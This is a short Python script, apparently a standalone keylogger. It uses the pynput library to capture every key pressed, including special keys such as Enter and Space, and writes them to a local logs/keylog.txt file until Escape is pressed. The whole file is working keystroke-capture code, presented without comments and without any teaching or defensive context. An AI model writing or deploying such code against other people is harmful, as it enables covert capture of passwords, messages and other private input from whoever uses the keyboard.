import os
import time
import logging
from pynput import keyboard

log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

logging.basicConfig(filename=os.path.join(log_dir, "keylog.txt"), level=logging.INFO)

def on_key_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            logging.info(" ")
        elif key == keyboard.Key.enter:
            logging.info("\n")
        else:
            logging.info("[" + str(key) + "]")

def on_key_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
